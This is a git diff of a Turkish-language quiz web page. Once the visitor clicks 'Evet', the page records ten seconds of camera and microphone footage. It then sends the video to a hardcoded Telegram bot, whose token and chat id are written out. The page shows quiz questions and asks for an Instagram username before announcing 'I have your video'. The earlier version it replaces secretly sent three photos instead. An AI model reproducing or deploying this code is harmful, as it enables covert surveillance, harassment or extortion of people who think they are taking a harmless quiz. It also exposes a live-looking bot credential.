@@ -2,51 +2,48 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>FERO Testi</title>
+  <title>FERO Video Quiz</title>
   <style>
     body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #111;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      flex-direction: column;
-      overflow: hidden;
+      display:flex;flex-direction:column;
+      justify-content:center;align-items:center;
+      height:100vh;background:#111;color:white;
+      font-family:Arial;text-align:center;
+      overflow:hidden;
     }
     button {
-      padding: 15px 30px;
-      margin: 10px;
-      border: none;
-      border-radius: 10px;
-      font-size: 18px;
-      cursor: pointer;
-      background: #ff0040;
-      color: white;
-      transition: 0.3s;
+      padding:15px 30px;border:none;
+      border-radius:10px;font-size:18px;
+      background:#ff0040;color:white;cursor:pointer;
+      margin:10px;
     }
-    button:hover { background: #ff3366; }
-    .question { display: none; margin-top: 20px; font-size: 20px; }
+    .question { display:none;margin-top:20px;font-size:20px; }
     .rose {
-      position: absolute;
-      top: -50px;
-      font-size: 24px;
-      animation: fall linear forwards;
-      opacity: 0.9;
+      position:absolute;top:-50px;font-size:24px;
+      animation: fall linear forwards;opacity:0.9;
     }
-    @keyframes fall {
-      to { transform: translateY(110vh) rotate(360deg); }
+    @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
+
+    /* 🔥 Neon efekt */
+    .neon {
+      font-size: 36px;
+      color: #ff0040;
+      text-transform: uppercase;
+      text-shadow: 0 0 5px #ff0040, 0 0 10px #ff0040, 
+                   0 0 20px #ff0040, 0 0 40px #ff0040;
+      animation: blink 1s infinite alternate;
+    }
+    @keyframes blink {
+      from { opacity: 1; text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040, 0 0 40px #ff0040; }
+      to   { opacity: 0.6; text-shadow: 0 0 5px #ff0040; }
     }
   </style>
 </head>
 <body>
   <h1>Devam etmek istiyor musun?</h1>
-  <button onclick="startCamera()">Evet</button>
+  <button onclick="startRecording()">Evet</button>
 
   <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
 
   <!-- Sorular -->
   <div id="q1" class="question">
@@ -66,46 +63,44 @@
   </div>
 
   <script>
+    let mediaRecorder;
+    let recordedChunks = [];
     let currentQuestion = 1;
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          // 3 foto arka arkaya çek
-          takePhotoAndSend();
-          setTimeout(takePhotoAndSend, 1500);
-          setTimeout(takePhotoAndSend, 3000);
+    async function startRecording() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
+      const video = document.getElementById("video");
+      video.style.display = "block";
+      video.srcObject = stream;
 
-          // İlk soru gelsin
-          document.querySelector("h1").style.display = "none";
-          document.querySelector("button").style.display = "none";
-          document.getElementById("q1").style.display = "block";
-        };
-      } catch (err) {
-        alert("Kamera izni verilmedi!");
-      }
+      mediaRecorder = new MediaRecorder(stream);
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) recordedChunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = sendVideoToTelegram;
+      mediaRecorder.start();
+
+      // 10 saniye sonra kaydı durdur
+      setTimeout(() => mediaRecorder.stop(), 10000);
     }
 
-    function takePhotoAndSend() {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    function sendVideoToTelegram() {
+      const blob = new Blob(recordedChunks, { type: "video/webm" });
+      const formData = new FormData();
+      formData.append("chat_id", "8494445812"); // senin chat id
+      formData.append("video", blob, "video.webm");
 
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", "8494445812"); // senin chat id
-        formData.append("photo", blob, "photo.png");
+      fetch("https://api.telegram.org/bot8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I/sendVideo", {
+        method: "POST",
+        body: formData
+      });
 
-        fetch("https://api.telegram.org/bot8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I/sendPhoto", {
-          method: "POST",
-          body: formData
-        });
-      }, "image/png");
+      // Video bittikten sonra sorular gelsin
+      document.querySelector("h1").style.display = "none";
+      document.querySelector("button").style.display = "none";
+      document.getElementById("video").style.display = "none";
+      document.getElementById("q1").style.display = "block";
     }
 
     function nextQuestion() {
@@ -118,10 +113,8 @@
       document.getElementById("q" + currentQuestion).style.display = "none";
       let username = prompt("Instagram kullanıcı adını gir (@fero):") || "@fero";
       document.body.innerHTML = `
-        <h1 style="font-size: 32px; color: #ff0040; text-transform: uppercase;">
-          HAYIRLI OLSUN FOTOĞRAFIN ELİMDE 😁
-        </h1>
-        <h2 style="margin-top:20px; color:white;">
+        <h1 class="neon">HAYIRLI OLSUN VİDEON ELİMDE 😁</h1>
+        <h2 style="margin-top:20px;color:white;">
           Kullanıcı adı: ${username}
         </h2>
       `;
